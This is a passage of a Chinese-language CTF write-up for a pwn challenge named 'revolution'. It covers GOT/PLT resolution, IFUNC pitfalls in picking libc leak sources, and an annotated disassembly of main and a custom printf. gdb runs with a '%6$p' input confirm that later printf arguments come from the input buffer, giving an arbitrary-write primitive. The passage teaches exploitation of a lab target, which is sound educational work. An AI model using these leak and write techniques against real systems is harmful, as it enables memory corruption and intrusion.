\begin{itemize}
\tightlist
\item
  \textbf{GOT（Global Offset
  Table）}：一張「函式真實位址」的表格，位於可寫資料段。
\item
  \textbf{第一次呼叫前}，\texttt{{[}0x404000{]}} 的值指向 \texttt{.\allowbreak{}plt}
  裡的延遲解析 stub：
\end{itemize}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000401030 <write@plt 的延遲解析 stub>:
  401034: push 0x0        ← 推入 relocation 索引（write 是第 0 個）
  401039: jmp  0x401020   ← 跳到 PLT0
0000000000401020 <.plt>:
  401020: push QWORD PTR [rip+0x2fca]  # 403ff0  ← link_map
  401026: jmp  QWORD PTR [rip+0x2fcc]  # 403ff8  ← _dl_runtime_resolve（動態連結器）
\end{Verbatim}

動態連結器解析完後會\textbf{把真正的位址寫回 GOT}，之後呼叫就直接跳
libc。

本題
\texttt{.\allowbreak{}rela.\allowbreak{}plt}（\texttt{readelf\ \allowbreak{}-\allowbreak{}r\ \allowbreak{}revolution}）決定索引順序：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x404000  R_X86_64_JUMP_SLOT  write        (索引 0)
0x404008  R_X86_64_JUMP_SLOT  strlen       (索引 1)
0x404010  R_X86_64_JUMP_SLOT  strcspn      (索引 2)
0x404018  R_X86_64_JUMP_SLOT  read         (索引 3)
0x404020  R_X86_64_JUMP_SLOT  setvbuf      (索引 4)
\end{Verbatim}

\textbf{什麼是 IFUNC（indirect function）？}

有些 libc
函式（\texttt{strlen}、\texttt{strcspn}、\texttt{memcpy}\ldots）在載入時會執行一小段「選擇器」程式碼，
依 CPU 支援的指令集挑出最快的實作（例如 \texttt{\_\allowbreak{}\_\allowbreak{}strcspn\_\allowbreak{}avx2}）。
所以\textbf{動態連結器寫進 GOT 的是「被挑中的那個實作」的位址，不是
\texttt{readelf\ \allowbreak{}-\allowbreak{}s} 上看到的符號值}
（符號值是選擇器本身）。實測（本機）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
strcspn@got - libc_base = 0x1935c0     ← 實際被挑中的實作
readelf -s libc | grep strcspn  →  0xaf070   ← 選擇器（兩者不同！）
\end{Verbatim}

這就是為什麼： * 拿 \texttt{strcspn@got} 當 libc 指紋會誤判（§11-4）； *
洩漏來源要挑 \texttt{setvbuf} / \texttt{read} / \texttt{write} /
\texttt{stdout} 這些\textbf{非} IFUNC 的符號。

\begin{quote}
\textbf{重要}：\texttt{setvbuf} 在 \texttt{main} 之前就被
\texttt{0x401190} 呼叫過，所以它的 GOT \textbf{一定有真實 libc 位址} →
我們的第一個資訊洩漏就挑它。而 \texttt{strlen}/\texttt{strcspn} 是
\textbf{IFUNC}（見 §11 常見坑 4）， GOT
裡存的是「被挑選的實作版本」，不是符號本身的 offset，這點等等會咬人。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{3. \texttt{main}
逐行解說（\texttt{0x4010d0}）}{3. main 逐行解說（0x4010d0）}}\label{main-ux9010ux884cux89e3ux8aaa0x4010d0}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{00000000004010d0 \textless{}main}\OperatorTok{\textgreater{}:}                     \CommentTok{; 由 \_\_libc\_start\_main 呼叫 (rdi = 0x4010d0)}
\NormalTok{  4010d0: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa        endbr64        }\CommentTok{; CET 合法進入點標記，無邏輯作用}
\NormalTok{  4010d4: 41 54              }\BuiltInTok{push} \KeywordTok{r12}        \CommentTok{; rsp {-}= 8; [rsp] = r12 (保存呼叫者的 r12)}
\NormalTok{  4010d6: ba }\FloatTok{1}\BaseNTok{f} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1f}   \CommentTok{; edx = 31  → write 的第 3 個參數「長度」}
\NormalTok{  4010db: 48 8d 35 46 0f 00 00  }\BuiltInTok{lea} \KeywordTok{rsi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xf46}\OperatorTok{]}   \CommentTok{; rsi = 0x402028 ("=== PRINT PRINT REVOLUTION ===\textbackslash{}n")}
\NormalTok{  4010e2: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}    \CommentTok{; edi = 1   → fd = stdout}
\NormalTok{  4010e7: 55                 }\BuiltInTok{push} \KeywordTok{rbp}        \CommentTok{; 保存 rbp}
\NormalTok{  4010e8: 4c 8d 25 2b 0c 00 00  }\BuiltInTok{lea} \KeywordTok{r12}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xf2b}\OperatorTok{]}   \CommentTok{; r12 = 0x40201a ("score\textgreater{} ")}
\NormalTok{  4010ef: 48 8d 2d 2c 0c 00 00  }\BuiltInTok{lea} \KeywordTok{rbp}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xf2c}\OperatorTok{]}   \CommentTok{; rbp = 0x402022 ("\textbackslash{}n")}
\NormalTok{  4010f6: 53                 }\BuiltInTok{push} \KeywordTok{rbx}        \CommentTok{; 保存 rbx}
\NormalTok{  4010f7: 48 81 ec }\DecValTok{00} \DecValTok{02} \DecValTok{00} \DecValTok{00}\NormalTok{  sub }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x200}  \CommentTok{; ✶ 開一個 0x200 bytes 的區域緩衝區}
\NormalTok{  4010fe: e8 }\DecValTok{7}\BaseNTok{d}\NormalTok{ ff ff ff     call }\BaseNTok{0x401080}   \CommentTok{; write(1, "=== PRINT...", 31)  → 印標題}
\NormalTok{  401103: ba }\DecValTok{20} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x20}   \CommentTok{; 32}
\NormalTok{  401108: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  40110d: 48 89 e3           mov  }\KeywordTok{rbx}\OperatorTok{,}\KeywordTok{rsp}    \CommentTok{; ✶✶ rbx = rsp = 緩衝區起始位址（以下叫 buf）}
\NormalTok{  401110: 48 8d 35 31 0c 00 00  }\BuiltInTok{lea} \KeywordTok{rsi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xf31}\OperatorTok{]}  \CommentTok{; rsi = 0x402048 ("Enter your score card template:\textbackslash{}n")}
\NormalTok{  401117: e8 }\DecValTok{64}\NormalTok{ ff ff ff     call }\BaseNTok{0x401080}   \CommentTok{; write(1, "...template:\textbackslash{}n", 32)}
\NormalTok{  40111c: eb }\DecValTok{31}\NormalTok{              jmp  }\BaseNTok{0x40114f}   \CommentTok{; 直接跳進迴圈「印提示」}

\NormalTok{{-}{-}{-} 迴圈頂端 {-}{-}{-}}
\NormalTok{  40114f: ba }\DecValTok{07} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x7}    \CommentTok{; 7}
\NormalTok{  401154: 4c 89 e6           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r12}    \CommentTok{; "score\textgreater{} "}
\NormalTok{  401157: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  40115c: e8 }\FloatTok{1}\BaseNTok{f}\NormalTok{ ff ff ff     call }\BaseNTok{0x401080}   \CommentTok{; write(1, "score\textgreater{} ", 7)}
\NormalTok{  401161: 31 ff              }\OperatorTok{xor}  \KeywordTok{edi}\OperatorTok{,}\KeywordTok{edi}    \CommentTok{; edi = 0  → fd = stdin}
\NormalTok{  401163: ba ff }\DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1ff}  \CommentTok{; ✶ 最多讀 511 bytes（緩衝區 512 bytes）}
\NormalTok{  401168: 48 89 de           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbx}    \CommentTok{; buf}
\NormalTok{  40116b: e8 }\DecValTok{40}\NormalTok{ ff ff ff     call }\BaseNTok{0x4010b0}   \CommentTok{; read(0, buf, 0x1ff)   → rax = 讀到幾個 byte}
\NormalTok{  401170: 48 85 c0           test }\KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}    \CommentTok{; rax 是否 \textless{}= 0（EOF / 錯誤）？}
\NormalTok{  401173: 7f ab              jg   }\BaseNTok{0x401120}   \CommentTok{; rax \textgreater{} 0 才繼續處理}
\NormalTok{  401175: 48 81 c4 }\DecValTok{00} \DecValTok{02} \DecValTok{00} \DecValTok{00}\NormalTok{  add }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x200}  \CommentTok{; 收工：還原堆疊}
\NormalTok{  40117c: 31 c0              }\OperatorTok{xor}  \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}    \CommentTok{; return 0}
\NormalTok{  40117e: 5b                 }\BuiltInTok{pop}  \KeywordTok{rbx}
\NormalTok{  40117f: 5d                 }\BuiltInTok{pop}  \KeywordTok{rbp}
\NormalTok{  401180: 41 5c              }\BuiltInTok{pop}  \KeywordTok{r12}
\NormalTok{  401182: c3                 ret             }\CommentTok{; 回到 \_\_libc\_start\_call\_main}

\NormalTok{{-}{-}{-} 處理剛讀到的那一行（0x401120）{-}{-}{-}}
\NormalTok{  401120: 48 89 ee           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbp}    \CommentTok{; rsi = "\textbackslash{}n"}
\NormalTok{  401123: 48 89 }\DataTypeTok{df}\NormalTok{           mov  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rbx}    \CommentTok{; rdi = buf}
\NormalTok{  401126: c6 }\DecValTok{04} \DecValTok{04} \DecValTok{00}\NormalTok{        mov  }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\BaseNTok{0x0}   \CommentTok{; ✶ buf[讀到的長度] = 0（補字串結尾）}
\NormalTok{  40112a: e8 }\DecValTok{71}\NormalTok{ ff ff ff     call }\BaseNTok{0x4010a0}   \CommentTok{; strcspn(buf, "\textbackslash{}n") → rax = 換行前的長度}
\NormalTok{  40112f: 48 89 }\DataTypeTok{df}\NormalTok{           mov  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rbx}    \CommentTok{; rdi = buf（printf 的第 1 個參數）}
\NormalTok{  401132: c6 }\DecValTok{04} \DecValTok{04} \DecValTok{00}\NormalTok{        mov  }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\BaseNTok{0x0}   \CommentTok{; buf[rax] = 0 → 把換行換成 \textquotesingle{}\textbackslash{}0\textquotesingle{}}
\NormalTok{  401136: 31 c0              }\OperatorTok{xor}  \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}    \CommentTok{; al = 0 → printf 的「有幾個 xmm 參數」}
\NormalTok{  401138: e8 f3 }\DecValTok{01} \DecValTok{00} \DecValTok{00}\NormalTok{     call }\BaseNTok{0x401330}   \CommentTok{; ✶✶ 自製 printf(buf)}
\NormalTok{  40113d: ba }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  401142: 48 89 ee           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbp}
\NormalTok{  401145: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  40114a: e8 }\DecValTok{31}\NormalTok{ ff ff ff     call }\BaseNTok{0x401080}   \CommentTok{; write(1, "\textbackslash{}n", 1)}
\NormalTok{  40114f: (fallthrough 回 }\BaseNTok{0x40114f}\NormalTok{ —— 迴圈頂端；}\BaseNTok{0x40114a}\NormalTok{ 的 call 是 }\DecValTok{5}\NormalTok{ bytes，}\BaseNTok{0x40114a}\OperatorTok{+}\DecValTok{5} \OperatorTok{=} \BaseNTok{0x40114f}\OperatorTok{)}
\end{Highlighting}
\end{Shaded}

\textbf{重點整理}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{buf} 就是 \texttt{rsp}（\texttt{mov\ \allowbreak{}rbx,\allowbreak{}rsp}），大小
  512，最多讀 511 bytes → \texttt{read}
  \textbf{沒有}溢位，\textbf{打不到返回位址}（網路上很多這題的猜測在這裡就錯了）。
\item
  讀完後
  \texttt{buf{[}strlen{]}\ \allowbreak{}=\ \allowbreak{}0}、\texttt{buf{[}strcspn(buf,"\textbackslash{}\allowbreak{}n"){]}\ \allowbreak{}=\ \allowbreak{}0}，把輸入變成
  C 字串。
\item
  然後把我們輸入的字串當成\textbf{格式字串}交給 \texttt{0x401330}。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{4. 自製 \texttt{printf}
逐行解說（\texttt{0x401330}）}{4. 自製 printf 逐行解說（0x401330）}}\label{ux81eaux88fd-printf-ux9010ux884cux89e3ux8aaa0x401330}

\paragraph{\texorpdfstring{4.1 入口：建立
\texttt{va\_\allowbreak{}list}（可變參數清單）}{4.1 入口：建立 va\_list（可變參數清單）}}\label{ux5165ux53e3ux5efaux7acb-va_listux53efux8b8aux53c3ux6578ux6e05ux55ae}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  401330: 41 57              }\BuiltInTok{push} \KeywordTok{r15}
\NormalTok{  401332: 49 89 ff           mov  }\KeywordTok{r15}\OperatorTok{,}\KeywordTok{rdi}        \CommentTok{; r15 = fmt（格式字串指標）}
\NormalTok{  401335: 41 56              }\BuiltInTok{push} \KeywordTok{r14}
\NormalTok{  401337: 41 55              }\BuiltInTok{push} \KeywordTok{r13}
\NormalTok{  401339: 41 54              }\BuiltInTok{push} \KeywordTok{r12}
\NormalTok{  40133b: 55                 }\BuiltInTok{push} \KeywordTok{rbp}
\NormalTok{  40133c: 53                 }\BuiltInTok{push} \KeywordTok{rbx}            \CommentTok{; 共 push 6 個 = 0x30 bytes}
\NormalTok{  40133d: 48 81 ec e8 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  sub }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0xe8}     \CommentTok{; 區域空間 0xe8}
\NormalTok{  401344: 48 89 74 24 38     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x38}\OperatorTok{],}\KeywordTok{rsi} \CommentTok{; ✶ 把「第 1 個可變參數暫存器」存到堆疊}
\NormalTok{  401349: 48 89 54 24 40     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x40}\OperatorTok{],}\KeywordTok{rdx} \CommentTok{; 第 2 個}
\NormalTok{  40134e: 48 89 4c 24 48     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x48}\OperatorTok{],}\KeywordTok{rcx} \CommentTok{; 第 3 個}
\NormalTok{  401353: 4c 89 44 24 50     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x50}\OperatorTok{],}\KeywordTok{r8}  \CommentTok{; 第 4 個}
\NormalTok{  401358: 4c 89 4c 24 58     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x58}\OperatorTok{],}\KeywordTok{r9}  \CommentTok{; 第 5 個}
\NormalTok{  40135d: 84 c0              test }\KeywordTok{al}\OperatorTok{,}\KeywordTok{al}          \CommentTok{; al = 0（main 有 xor eax,eax）→ 不存 xmm}
\NormalTok{  40135f: 74 3a              }\ControlFlowTok{je}   \BaseNTok{0x40139b}
\NormalTok{  ... (若 al }\OperatorTok{!=} \DecValTok{0}\NormalTok{ 會用 movaps 把 }\KeywordTok{xmm0}\OperatorTok{{-}}\KeywordTok{xmm7}\NormalTok{ 存到 }\OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x60}\OperatorTok{]..[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0xd0}\OperatorTok{])}
\end{Highlighting}
\end{Shaded}

接著建立 \texttt{va\_\allowbreak{}list} 結構（SysV ABI 的 \texttt{va\_\allowbreak{}list} 是 24
bytes）：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  40139b: 31 }\DataTypeTok{db}              \OperatorTok{xor}  \KeywordTok{ebx}\OperatorTok{,}\KeywordTok{ebx}        \CommentTok{; ebx = 0（「沒有寫索引」時的流水號計數器）}
\NormalTok{  40139d: 4c 8d 25 62 0c 00 00  }\BuiltInTok{lea} \KeywordTok{r12}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xc62}\OperatorTok{]}  \CommentTok{; r12 = 0x402006 ("ok")}
\NormalTok{  4013a4: 4c 8d 35 5e 0c 00 00  }\BuiltInTok{lea} \KeywordTok{r14}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xc5e}\OperatorTok{]}  \CommentTok{; r14 = 0x402009 ("0123456789abcdef")}
\NormalTok{  4013ab: c7 }\DecValTok{44} \DecValTok{24} \DecValTok{18} \DecValTok{08} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov }\DataTypeTok{DWORD} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x18}\OperatorTok{],}\BaseNTok{0x8}   \CommentTok{; va\_list.gp\_offset   = 8}
\NormalTok{  4013b3: 48 8d 84 24 20 01 00 00  }\BuiltInTok{lea} \KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x120}\OperatorTok{]}
\NormalTok{  4013bb: c7 }\DecValTok{44} \DecValTok{24} \DecValTok{1}\ErrorTok{c} \DecValTok{30} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov }\DataTypeTok{DWORD} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x1c}\OperatorTok{],}\BaseNTok{0x30}  \CommentTok{; va\_list.fp\_offset   = 0x30}
\NormalTok{  4013c3: 48 8d 2d 3a 0c 00 00  }\BuiltInTok{lea} \KeywordTok{rbp}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xc3a}\OperatorTok{]}  \CommentTok{; rbp = 0x402004 ("\%")}
\NormalTok{  4013ca: 48 89 44 24 20     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x20}\OperatorTok{],}\KeywordTok{rax}  \CommentTok{; va\_list.overflow\_arg\_area = rsp+0x120  ✶✶✶}
\NormalTok{  4013cf: 48 8d 44 24 30     }\BuiltInTok{lea}  \KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x30}\OperatorTok{]}
\NormalTok{  4013d4: 48 89 44 24 28     }\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x28}\OperatorTok{],}\KeywordTok{rax}  \CommentTok{; va\_list.reg\_save\_area     = rsp+0x30}
\NormalTok{  4013d9: 41 0f b6 }\DecValTok{07}\NormalTok{        movzx }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r15}\OperatorTok{]}   \CommentTok{; eax = *fmt}
\NormalTok{  4013dd: 84 c0              test }\KeywordTok{al}\OperatorTok{,}\KeywordTok{al}
\NormalTok{  4013df: 0f 84 ac }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  je   }\BaseNTok{0x401491}        \CommentTok{; 字串結尾 → 收工}
\end{Highlighting}
\end{Shaded}

\texttt{va\_\allowbreak{}list} 的意義：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
偏移
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
欄位
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
值（本題）
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意義
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{+0x18} & \texttt{gp\_\allowbreak{}offset} & \texttt{8} & 下一個整數參數要從
\texttt{reg\_\allowbreak{}save\_\allowbreak{}area+8} 拿（跳過 \texttt{+0} 的洞） \\
\texttt{+0x1c} & \texttt{fp\_\allowbreak{}offset} & \texttt{0x30} &
浮點參數的位置（本題用不到） \\
\texttt{+0x20} & \texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area} & \texttt{rsp+0x120} &
暫存器用完後，參數改從這裡往高位址拿 \\
\texttt{+0x28} & \texttt{reg\_\allowbreak{}save\_\allowbreak{}area} & \texttt{rsp+0x30} & 前面存的
rsi/rdx/rcx/r8/r9 所在位置 \\
\end{longtable}
}

\textbf{★ 這是整個題目的核心}：\texttt{rsp+0x120} 到底在哪？用 gdb
實測：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{$}\NormalTok{ cd /home/kzzz/Documents/code/ctf/sunshine/pwn3}
\ExtensionTok{$}\NormalTok{ printf }\StringTok{\textquotesingle{}\%\%6$p\textbackslash{}n\textquotesingle{}} \OperatorTok{\textgreater{}}\NormalTok{ /tmp/rev\_in      }\CommentTok{\# ✶ 先寫成檔案：不能用 \textless{}(...)，因為 gdb 開的子 shell 可能是 dash}
\ExtensionTok{$}\NormalTok{ gdb }\AttributeTok{{-}q} \AttributeTok{{-}batch} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}file ./revolution\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}break *0x4013d9\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}run \textless{} /tmp/rev\_in\textquotesingle{}} \DataTypeTok{\textbackslash{}}
      \AttributeTok{{-}ex} \StringTok{\textquotesingle{}p/x $rsp\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}p/x $rsp+0x120\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}info registers rdi r15\textquotesingle{}} \DataTypeTok{\textbackslash{}}
      \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/1gx $rsp+0xe8\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/1gx $rsp+0x120\textquotesingle{}}
\ExtensionTok{Breakpoint}\NormalTok{ 1, 0x00000000004013d9 in }\PreprocessorTok{??} \ErrorTok{(}\KeywordTok{)}
\VariableTok{$1}\NormalTok{ = 0x7fffffffdac0                        }\CommentTok{\# printf 內部的 rsp  → = buf{-}0x120}
\VariableTok{$2}\NormalTok{ = 0x7fffffffdbe0                        }\CommentTok{\# ← rsp+0x120 = va\_list.overflow\_arg\_area = buf}
\ExtensionTok{rdi}\NormalTok{            0x7fffffffdbe0              }\CommentTok{\# ← 格式字串指標，也等於 buf}
\ExtensionTok{r15}\NormalTok{            0x7fffffffdbe0              }\CommentTok{\# ← printf 自己抄了一份（mov r15,rdi）}
\ExtensionTok{0x7fffffffdba8:}\NormalTok{ 0x00007fffffffdbe0         }\CommentTok{\# ← [rsp+0xe8] = buf{-}0x38 = 保存的 rbx = buf  ✶}
\ExtensionTok{0x7fffffffdbe0:}\NormalTok{ 0x0000000070243625         }\CommentTok{\# ← [rsp+0x120] = [buf] 的前 8 bytes = "\%6$p\textbackslash{}0\textbackslash{}0\textbackslash{}0\textbackslash{}0"}
\end{Highlighting}
\end{Shaded}

上面那條 gdb 指令一次就驗證了四件事：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
\texttt{-\allowbreak{}ex} 參數
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
證明什麼
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{break\ \allowbreak{}*0x4013d9} & 停在 \texttt{printf} 剛把 \texttt{va\_\allowbreak{}list}
建好、準備讀第一個字元的位置 \\
\texttt{p/\allowbreak{}x\ \allowbreak{}\$\allowbreak{}rsp} + \texttt{p/\allowbreak{}x\ \allowbreak{}\$\allowbreak{}rsp+0x120} &
\texttt{overflow\_\allowbreak{}arg\_\allowbreak{}area} 的值就是 \texttt{rsp+0x120}（見 §4.1 的
\texttt{mov\ \allowbreak{}{[}rsp+0x20{]},\allowbreak{}rax}） \\
\texttt{info\ \allowbreak{}registers\ \allowbreak{}rdi\ \allowbreak{}r15} & \texttt{rdi} =
傳進來的格式字串指標、\texttt{r15\ \allowbreak{}=\ \allowbreak{}rdi} → 兩個都等於 \texttt{buf} \\
\texttt{x/\allowbreak{}1gx\ \allowbreak{}\$\allowbreak{}rsp+0xe8} & \texttt{{[}rsp+0xe8{]}} = \texttt{buf-\allowbreak{}0x38}
= \texttt{printf} 保存的 \texttt{rbx} = \texttt{buf}（見 §7.2
的表格） \\
\texttt{x/\allowbreak{}1gx\ \allowbreak{}\$\allowbreak{}rsp+0x120} & \texttt{{[}rsp+0x120{]}} =
\texttt{{[}buf{]}} = 我們輸入的前 8
bytes（\texttt{"\%\allowbreak{}6\$\allowbreak{}p\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0\textbackslash{}\allowbreak{}0"}） \\
\end{longtable}
}

→ \texttt{rsp+0x120\ \allowbreak{}==\ \allowbreak{}r15\ \allowbreak{}==\ \allowbreak{}rdi\ \allowbreak{}==\ \allowbreak{}buf}，\textbf{這就證明了「第
6 個之後的可變參數 = 我們的輸入」}。

\begin{quote}
※注意 三個新手常踩的雷： 1.
\texttt{-\allowbreak{}ex\ \allowbreak{}\textquotesingle{}\allowbreak{}...\allowbreak{}\textquotesingle{}\allowbreak{}}（把省略號當指令貼）會噴
\texttt{No\ \allowbreak{}symbol\ \allowbreak{}"..."}，一定要填真的指令。 2.
\texttt{run\ \allowbreak{}\textless{}\allowbreak{}\ \allowbreak{}\textless{}\allowbreak{}(printf\ \allowbreak{}...)} 需要 bash 的 process
substitution，但 \textbf{gdb 是用 \texttt{/\allowbreak{}bin/\allowbreak{}sh} 開子 shell}；
Ubuntu/Debian 的 \texttt{/\allowbreak{}bin/\allowbreak{}sh} 是 dash →
\texttt{sh:\allowbreak{}\ \allowbreak{}1:\allowbreak{}\ \allowbreak{}Syntax\ \allowbreak{}error:\allowbreak{}\ \allowbreak{}"("\ \allowbreak{}unexpected}。 \textbf{先用
\texttt{printf\ \allowbreak{}...\allowbreak{}\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}/\allowbreak{}tmp/\allowbreak{}rev\_\allowbreak{}in} 寫檔再
\texttt{run\ \allowbreak{}\textless{}\allowbreak{}\ \allowbreak{}/\allowbreak{}tmp/\allowbreak{}rev\_\allowbreak{}in}} 就完全可攜。 3. 最後那行
\texttt{x/\allowbreak{}1gx\ \allowbreak{}\$\allowbreak{}rsp+0xe8} 是\textbf{證明「保存的 rbx ==
buf」的唯一直接證據}（見 §7.2 的堆疊圖）。
\end{quote}

為什麼會一樣？因為：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
main:  call 0x401330                 → 推入返回位址，rsp = buf - 8
printf: push ×6 (0x30) + sub rsp,0xe8 → rsp = buf - 8 - 0x30 - 0xe8 = buf - 0x120
        rsp + 0x120 == buf  ✓
\end{Verbatim}

也就是說：\textbf{第 6
個（含）以後的「可變參數」直接從我們輸入的緩衝區開頭開始拿}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
第 N 個參數  ==  *(u64 *)(buf + 8*(N-6))
\end{Verbatim}

\texttt{main} 只傳了 \texttt{rdi\ \allowbreak{}=\ \allowbreak{}buf}
一個參數，其他「參數」其實就是我們的輸入內容。這是作者刻意的設計
（\texttt{\%\allowbreak{}N\$\allowbreak{}w}
這種「寫入」語法一看就是刻意留的後門），但它同時也是一個\textbf{沒有任何邊界檢查}的任意寫入原語。

\paragraph{4.2
